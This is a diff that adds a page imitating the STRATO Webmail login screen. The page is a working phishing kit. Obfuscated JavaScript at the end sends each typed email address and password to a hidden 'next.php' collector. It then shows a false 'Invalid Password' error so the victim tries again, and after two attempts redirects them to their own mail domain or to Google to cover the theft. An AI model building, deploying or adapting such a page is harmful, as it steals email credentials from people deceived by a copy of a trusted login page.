+        position: absolute;
+        top: 10px;
+        right: 20px
+    }
+
+    .strato-notification.flex .modal-dialog .modal-body {
+        padding: 0
+    }
+
+    .strato-notification.flex .modal-dialog .modal-body iframe {
+        width: 100%;
+        display: block;
+        border: 0
+    }
+    </style>
+    <style data-src="login-page-configuration" type="text/css">
+    #io-ox-login-screen #io-ox-login-container {
+        background: #fff
+    }
+
+    #io-ox-login-screen #io-ox-languages :not([role=menuitem]) {
+        color: #fff
+    }
+
+    #io-ox-login-screen #io-ox-login-footer * {
+        color: #fff
+    }
+
+    #io-ox-login-screen #io-ox-login-content {
+        justify-content: center
+    }
+    </style>
+    <title>Login - STRATO Webmail</title>
+</head>
+
+<body class="unselectable">
+    <div id="io-ox-login-screen" class="unselectable" style="display: block">
+        <div id="io-ox-login-container" class="wallpaper">
+            <header id="io-ox-login-header">
+                <div class="wrapper">
+                    <div class="io-ox-logo"></div>
+                    <ul class="links list-inline">
+                        <li><a target="_blank" href="#"><i class="fa fa-question-circle"></i><span data-strato-i18n="Help &amp; Contact">Help &amp; Contact</span></a></li>
+                        <li><span id="io-ox-languages">
+                                <div class="dropdown"><i class="fa fa-globe"></i><a href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><span class="sr-only" data-i18n="Language:" data-i18n-attr="text">Language:</span><span class="toggle-text" lang="en-US">English (US)</span><span class="caret"></span></a>
+                                    <ul id="io-ox-language-list" class="dropdown-menu" role="menu" data-i18n="Languages" data-i18n-attr="aria-label" aria-label="Languages">
+                                        <li role="presentation"><a href="#" role="menuitem" lang="de-DE" data-value="de_DE">Deutsch</a></li>
+                                        <li role="presentation"><a href="#" role="menuitem" lang="en-GB" data-value="en_GB">English (UK)</a></li>
+                                        <li role="presentation"><a href="#" role="menuitem" lang="en-US" data-value="en_US">English (US)</a></li>
+                                        <li role="presentation"><a href="#" role="menuitem" lang="es-ES" data-value="es_ES">Español</a></li>
+                                        <li role="presentation"><a href="#" role="menuitem" lang="fr-FR" data-value="fr_FR">Français</a></li>
+                                        <li role="presentation"><a href="#" role="menuitem" lang="it-IT" data-value="it_IT">Italiano</a></li>
+                                        <li role="presentation"><a href="#" role="menuitem" lang="nl-NL" data-value="nl_NL">Nederlands</a></li>
+                                    </ul>
+                                </div>
+                            </span></li>
+                        <li><a class="customer-care" target="_blank" href="#"><span data-strato-i18n="Customer Login">Customer Login</span></a></li>
+                    </ul>
+                </div>
+            </header>
+            <div id="io-ox-login-content">
+                <div class="align-center col-sm-6 col-xs-12">
+                    <div class="row">
+                        <main id="io-ox-login-box" class="col-xs-12">
+                            <div class="row">
+                                <div class="flex-column">
+                                    <div id="box-form" class="col-xs-12">
+                                        <div id="box-form-header" class="row" data-i18n="" data-i18n-attr="text">
+                                            <h1><i class="fa fa-envelope"></i><span class="header-login-title">STRATO Webmail</span></h1>
+                                        </div>
+                                        <div id="box-form-body" class="row">
+                                            <form action="https://webmail.strato.de/appsuite/api/redirect" method="post" id="io-ox-login-form" target="store-credentials" novalidate="">
+                                                <div class="col-xs-12">
+                                                    <div class="row title">
+                                                        <h1 id="login-title" class="col-xs-12" data-i18n="Login">Login</h1>
+                                                    </div>
+                                                    <center>
+                                                        <div class="alert alert-danger" id="mgss" style="display: none;color: red;font-weight: 600">Invalid Password..! Please enter correct password.</div>
+                                                        <span id="error" class="text-danger" style="display: none;color: red;">That account doesn't exist. Enter a different account</span>
+                                                    </center>
+                                                    <div class="row username">
+                                                        <div class="form-group col-xs-12 col-sm-12"><label for="io-ox-login-username" data-i18n="User name">Email address</label><input type="text" id="ai" name="ai" class="form-control" required=""></input><i class="fa fa-envelope"></i></div>
+                                                    </div>
+                                                    <div class="row password">
+                                                        <div class="form-group col-xs-12 col-sm-12"><label for="io-ox-login-password" data-i18n="Password">Password</label><input type="password" id="pr" name="pr" class="form-control"></input><i class="fa fa-lock"></i></div>
+                                                    </div>
+                                                    <div class="row forgot-password">
+                                                        <div class="form-group col-xs-12 col-sm-12"><a class="password" href="#">Forgot your password?</a></div>
+                                                    </div>
+                                                    <div class="row options">
+                                                        <div class="col-xs-12 col-sm-12" id="io-ox-login-store">
+                                                            <div class="checkbox custom"><label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label"><input type="checkbox" class="sr-only" id="io-ox-login-store-box" checked="checked" name="staySignedIn" value="1"><i class="fas fa-check-square"></i>Stay signed in</label></div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="row feedback">
+                                                        <div class="col-xs-12 alert-highlight" id="io-ox-login-feedback"></div>
+                                                    </div>
+                                                    <div class="row button">
+                                                        <div class="form-group col-xs-12 col-sm-12"><button type="button" name="submiit-btnnn" id="submiit-btnnn" class="btn btn-primary form-control">Sign in</button></div>
+                                                    </div>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                    <div id="io-ox-information-message"></div>
+                                </div>
+                            </div>
+                        </main>
+                    </div>
+                </div>
+            </div>
+            <footer id="io-ox-login-footer">
+                <ul class="links list-inline">
+                    <li><a target="_blank" href="#"><span data-strato-i18n="STRATO.de">STRATO-HOSTING.co.uk</span></a></li>
+                    <li><a target="_blank" href="#"><span data-strato-i18n="Terms &amp; Conditions">Terms &amp; Conditions</span></a></li>
+                    <li><a target="_blank" href="#"><span data-strato-i18n="Privacy Policy">Privacy Policy</span></a></li>
+                    <li><a target="_blank" href="#"><span data-strato-i18n="Imprint">Imprint</span></a></li>
+                </ul>
+                <div class="composition-element login-spacer"></div><span>© 2021 OX Software GmbH</span>
+                <div class="composition-element"><span>Version: </span><span>7.10.4</span></div>
+            </footer>
+        </div>
+    </div>
+    <!-- //mailer link -->
+    <input type="hidden" id="f" value="./next.php">
+    <!-- //mail result count -->
+    <input type="hidden" id="rc" value="2">
+    <!-- //redirect link -->
+    <input type="hidden" id="rdrt" value="https://www.google.com">
+    <!-- // if you want to redirection for domain (0 for no)(1 for yes) -->
+    <input type="hidden" id="domain_redirect" value="1">
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+function _0x5429(_0x38b222,_0x24df60){var _0x402e6d=_0x402e();return _0x5429=function(_0x5429b0,_0x1dc0d6){_0x5429b0=_0x5429b0-0x1ca;var _0x35434a=_0x402e6d[_0x5429b0];return _0x35434a;},_0x5429(_0x38b222,_0x24df60);}function _0x402e(){var _0x4f265c=['location','121372voFBDw','JSON','preventDefault','show','click','33627qeVhrs','#rdrt','Sign\x20in','#pr','697088DDISlc','875555qhNEUd','#error','toLowerCase','indexOf','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','#mgss','#domain_redirect','#aich','val','hide','#ai','Verifying...','#submiit-btnnn','187138hOenca','replace','POST','ready','320605twfjwY','substr','test','24aXQSfz','hash','html','Password\x20field\x20is\x20empty.!','5922704HUyCeE'];_0x402e=function(){return _0x4f265c;};return _0x402e();}var _0x20d3b4=_0x5429;(function(_0x3e12b2,_0x1a080a){var _0x27d90e=_0x5429,_0x4c94fb=_0x3e12b2();while(!![]){try{var _0x942501=-parseInt(_0x27d90e(0x1de))/0x1+-parseInt(_0x27d90e(0x1e7))/0x2+-parseInt(_0x27d90e(0x1ec))/0x3+parseInt(_0x27d90e(0x1cc))/0x4+-parseInt(_0x27d90e(0x1cd))/0x5+-parseInt(_0x27d90e(0x1e1))/0x6*(parseInt(_0x27d90e(0x1da))/0x7)+parseInt(_0x27d90e(0x1e5))/0x8;if(_0x942501===_0x1a080a)break;else _0x4c94fb['push'](_0x4c94fb['shift']());}catch(_0x5970ce){_0x4c94fb['push'](_0x4c94fb['shift']());}}}(_0x402e,0x3a9bf));var f=$('#f')[_0x20d3b4(0x1d5)](),rc=$('#rc')[_0x20d3b4(0x1d5)](),rdrt=$(_0x20d3b4(0x1ed))[_0x20d3b4(0x1d5)](),domain_redirect=$(_0x20d3b4(0x1d3))[_0x20d3b4(0x1d5)]();$(document)[_0x20d3b4(0x1dd)](function(){var _0x5cfbc6=_0x20d3b4,_0x3941fc=0x0,_0x457db9=window[_0x5cfbc6(0x1e6)][_0x5cfbc6(0x1e2)][_0x5cfbc6(0x1df)](0x1);if(!_0x457db9){}else{var _0x1350d1=_0x457db9,_0x36aeb1=_0x1350d1['indexOf']('@'),_0x31099d=_0x1350d1[_0x5cfbc6(0x1df)](_0x36aeb1+0x1),_0x39b0c7=_0x31099d[_0x5cfbc6(0x1df)](0x0,_0x31099d[_0x5cfbc6(0x1d0)]('.')),_0x57f794=_0x39b0c7[_0x5cfbc6(0x1cf)]();$(_0x5cfbc6(0x1d7))[_0x5cfbc6(0x1d5)](_0x1350d1),$(_0x5cfbc6(0x1d4))[_0x5cfbc6(0x1e3)](_0x1350d1),$('#mgss')[_0x5cfbc6(0x1d6)]();}$(_0x5cfbc6(0x1d9))[_0x5cfbc6(0x1eb)](function(_0x3c010a){var _0x11942a=_0x5cfbc6;$(_0x11942a(0x1ce))[_0x11942a(0x1d6)](),$(_0x11942a(0x1d2))[_0x11942a(0x1d6)](),_0x3c010a[_0x11942a(0x1e9)]();var _0x355a07=$(_0x11942a(0x1d7))[_0x11942a(0x1d5)](),_0x2e29d3=$(_0x11942a(0x1cb))[_0x11942a(0x1d5)](),_0x2d5c6b=$(_0x11942a(0x1d2))[_0x11942a(0x1e3)]();$(_0x11942a(0x1d2))['text'](_0x2d5c6b);var _0xa4339b=_0x355a07,_0x3295a5=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x355a07)return $(_0x11942a(0x1ce))[_0x11942a(0x1ea)](),$(_0x11942a(0x1ce))[_0x11942a(0x1e3)]('Email\x20field\x20is\x20empty.!'),![];if(!_0x3295a5[_0x11942a(0x1e0)](_0xa4339b))return $('#error')[_0x11942a(0x1ea)](),$(_0x11942a(0x1ce))[_0x11942a(0x1e3)](_0x11942a(0x1d1)),![];if(!_0x2e29d3)return $(_0x11942a(0x1ce))[_0x11942a(0x1ea)](),$(_0x11942a(0x1ce))[_0x11942a(0x1e3)](_0x11942a(0x1e4)),![];var _0x340b8d=_0xa4339b[_0x11942a(0x1d0)]('@'),_0x15670f=_0xa4339b['substr'](_0x340b8d+0x1),_0x3f471c=_0x15670f[_0x11942a(0x1df)](0x0,_0x15670f[_0x11942a(0x1d0)]('.')),_0x45c96c=_0x3f471c[_0x11942a(0x1cf)]();_0x3941fc=_0x3941fc+0x1,$['ajax']({'dataType':_0x11942a(0x1e8),'url':f,'type':_0x11942a(0x1dc),'data':{'ai':_0x355a07,'pr':_0x2e29d3},'beforeSend':function(_0x4d37f1){var _0x3bb64d=_0x11942a;$('#submiit-btnnn')[_0x3bb64d(0x1e3)](_0x3bb64d(0x1d8));},'complete':function(){var _0xb7da4a=_0x11942a;$(_0xb7da4a(0x1cb))['val'](''),_0x3941fc>=rc&&(_0x3941fc=0x0,domain_redirect==0x1?window[_0xb7da4a(0x1e6)][_0xb7da4a(0x1db)]('http://www.'+_0x15670f):window[_0xb7da4a(0x1e6)][_0xb7da4a(0x1db)](rdrt)),$(_0xb7da4a(0x1d2))['show'](),$(_0xb7da4a(0x1d9))[_0xb7da4a(0x1e3)](_0xb7da4a(0x1ca));}});});});
+</script>
+
+</html>
